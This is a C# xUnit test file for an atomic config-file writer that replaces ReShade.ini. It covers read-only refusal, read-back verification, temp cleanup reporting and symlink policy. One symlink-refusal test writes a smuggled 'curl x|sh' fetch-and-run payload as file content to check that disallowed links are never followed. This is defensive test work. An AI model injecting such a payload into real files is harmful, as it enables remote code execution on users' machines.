using System.Runtime.Versioning;
using RHI.Core.Deployment;

namespace RHI.Core.Tests;

// AtomicFile.ReplaceUserFile (folded from UserFileWriter; review w1-renodx-p0 findings 3-6): read-only refusal, link policy, read-back verify,
// folder fsync, temp cleanup reported instead of swallowed.
[SupportedOSPlatform("linux")]
public sealed class AtomicFileUserFileTests : IDisposable
{
    private readonly string _root = Path.Combine(Path.GetTempPath(), "rhi-user-file-writer-tests-" + Guid.NewGuid().ToString("N"));

    public AtomicFileUserFileTests() => Directory.CreateDirectory(_root);

    [Fact]
    public void Write_ReplacesTheFileAndSyncsItsFolder()
    {
        var file = Path.Combine(_root, "ReShade.ini");
        File.WriteAllText(file, "old");
        File.SetUnixFileMode(file, UnixFileMode.UserRead | UnixFileMode.UserWrite | UnixFileMode.GroupRead);

        var result = AtomicFile.ReplaceUserFile(file, "new"u8.ToArray());

        Assert.Equal(file, result.WrittenPath);
        Assert.True(result.DirectorySynced);
        Assert.Equal("new", File.ReadAllText(file));
        Assert.Equal(UnixFileMode.UserRead | UnixFileMode.UserWrite | UnixFileMode.GroupRead, File.GetUnixFileMode(file));
        Assert.Single(Directory.EnumerateFileSystemEntries(_root));
    }

    [Fact]
    public void Write_ReadOnlyTarget_IsRefusedAndLeftAlone()
    {
        var file = Path.Combine(_root, "ReShade.ini");
        File.WriteAllText(file, "locked by the user");
        File.SetUnixFileMode(file, UnixFileMode.UserRead | UnixFileMode.GroupRead | UnixFileMode.OtherRead);

        var refused = Assert.Throws<IOException>(() => AtomicFile.ReplaceUserFile(file, "new"u8.ToArray()));

        Assert.Equal(AtomicFile.ReadOnlyRefusalPrefix + file, refused.Message);
        Assert.Equal("locked by the user", File.ReadAllText(file));
        Assert.Equal(UnixFileMode.UserRead | UnixFileMode.GroupRead | UnixFileMode.OtherRead, File.GetUnixFileMode(file));
        Assert.Single(Directory.EnumerateFileSystemEntries(_root));
    }

    [Fact]
    public void Write_ContentThatDoesNotReadBack_IsRefusedBeforeTheRename()
    {
        var file = Path.Combine(_root, "ReShade.ini");
        File.WriteAllText(file, "original");

        var refused = Assert.Throws<IOException>(() =>
            AtomicFile.ReplaceUserFile(file, "intended"u8.ToArray(), wrapOutput: inner => new CorruptingStream(inner)));

        Assert.Equal(AtomicFile.VerifyFailurePrefix + file, refused.Message);
        Assert.Equal("original", File.ReadAllText(file));
        Assert.Single(Directory.EnumerateFileSystemEntries(_root));
    }

    [Fact]
    public void Write_TempThatCannotBeRemoved_IsReportedNotSwallowed()
    {
        var folder = Path.Combine(_root, "game");
        Directory.CreateDirectory(folder);
        var file = Path.Combine(folder, "ReShade.ini");
        File.WriteAllText(file, "original");
        try
        {
            var failed = Assert.Throws<IOException>(() => AtomicFile.ReplaceUserFile(file, "new"u8.ToArray(),
                wrapOutput: inner => new LockFolderThenFailStream(inner, folder)));

            Assert.Contains(AtomicFile.TempLeftoverFragment, failed.Message, StringComparison.Ordinal);
            Assert.StartsWith("No space left on device", failed.Message, StringComparison.Ordinal);
            Assert.Equal("original", File.ReadAllText(file));
        }
        finally
        {
            File.SetUnixFileMode(folder, UnixFileMode.UserRead | UnixFileMode.UserWrite | UnixFileMode.UserExecute);
        }
    }

    [Fact]
    public void Write_SymlinkWithoutPolicy_IsRefused()
    {
        var real = Path.Combine(_root, "real.ini");
        File.WriteAllText(real, "real");
        var link = Path.Combine(_root, "ReShade.ini");
        File.CreateSymbolicLink(link, real);

        var refused = Assert.Throws<IOException>(() => AtomicFile.ReplaceUserFile(link, "new"u8.ToArray()));

        Assert.Equal(AtomicFile.LinkRefusalPrefix + link, refused.Message);
        Assert.Equal("real", File.ReadAllText(real));
    }

    [Fact]
    public void Write_AllowedLinkThroughSymlinkedFolders_ResolvesBothSidesBeforeComparing()
    {
        // The game folder itself is reached through a symlink (library on another drive) and the ini links to a
        // sibling inside it: the canonical target is inside the canonical root, so the write goes through.
        var realGame = Path.Combine(_root, "drive", "Game");
        Directory.CreateDirectory(Path.Combine(realGame, "config"));
        var realIni = Path.Combine(realGame, "config", "reshade.INI");
        File.WriteAllText(realIni, "old");
        var linkedGame = Path.Combine(_root, "library-Game");
        Directory.CreateSymbolicLink(linkedGame, realGame);
        var link = Path.Combine(linkedGame, "ReShade.ini");
        File.CreateSymbolicLink(link, Path.Combine("config", "reshade.INI"));
        var policy = new UserFileLinkPolicy("reshade.ini", [linkedGame], "refused: ");

        var result = AtomicFile.ReplaceUserFile(link, "new"u8.ToArray(), policy);

        Assert.Equal(realIni, result.WrittenPath);
        Assert.Equal("new", File.ReadAllText(realIni));
        Assert.NotNull(new FileInfo(link).LinkTarget);
    }

    [Theory]
    [InlineData("outside/reshade.ini")]   // right name, outside every allowed root
    [InlineData("game/notes.txt")]        // inside the root, wrong name
    [InlineData("game/reshade.ini.bak")]  // look-alike name
    public void Write_LinkOutsideRootsOrToAnotherName_IsRefused(string relativeTarget)
    {
        var game = Path.Combine(_root, "game");
        Directory.CreateDirectory(game);
        Directory.CreateDirectory(Path.Combine(_root, "outside"));
        var target = Path.Combine(_root, relativeTarget);
        File.WriteAllText(target, "victim");
        var link = Path.Combine(game, "ReShade.ini");
        File.CreateSymbolicLink(link, target);
        var policy = new UserFileLinkPolicy("reshade.ini", [game], "ReShade.ini link not followed: ");

        var refused = Assert.Throws<IOException>(() => AtomicFile.ReplaceUserFile(link, "Key=0;curl x|sh\n"u8.ToArray(), policy));

        Assert.Equal($"ReShade.ini link not followed: {link} -> {target}", refused.Message);
        Assert.Equal("victim", File.ReadAllText(target));
    }

    public void Dispose()
    {
        try { Directory.Delete(_root, true); } catch (IOException) { } catch (UnauthorizedAccessException) { }
    }

    /// <summary>Writes every byte flipped but reports success, like a silently corrupting device.</summary>
    private sealed class CorruptingStream(Stream inner) : Stream
    {
        public override bool CanRead => false;
        public override bool CanSeek => false;
        public override bool CanWrite => true;
        public override long Length => inner.Length;
        public override long Position { get => inner.Position; set => throw new NotSupportedException(); }
        public override void Flush() => inner.Flush();
        public override int Read(byte[] buffer, int offset, int count) => throw new NotSupportedException();
        public override long Seek(long offset, SeekOrigin origin) => throw new NotSupportedException();
        public override void SetLength(long value) => throw new NotSupportedException();
        public override void Write(byte[] buffer, int offset, int count)
            => inner.Write(buffer.Skip(offset).Take(count).Select(b => (byte)~b).ToArray());
    }

    /// <summary>Makes the folder read-only (so the temp cannot be deleted), then fails like a full disk.</summary>
    private sealed class LockFolderThenFailStream(Stream inner, string folder) : Stream
    {
        public override bool CanRead => false;
        public override bool CanSeek => false;
        public override bool CanWrite => true;
        public override long Length => inner.Length;
        public override long Position { get => inner.Position; set => throw new NotSupportedException(); }
        public override void Flush() => inner.Flush();
        public override int Read(byte[] buffer, int offset, int count) => throw new NotSupportedException();
        public override long Seek(long offset, SeekOrigin origin) => throw new NotSupportedException();
        public override void SetLength(long value) => throw new NotSupportedException();
        public override void Write(byte[] buffer, int offset, int count)
        {
            File.SetUnixFileMode(folder, UnixFileMode.UserRead | UnixFileMode.UserExecute);
            throw new IOException("No space left on device");
        }
    }
}
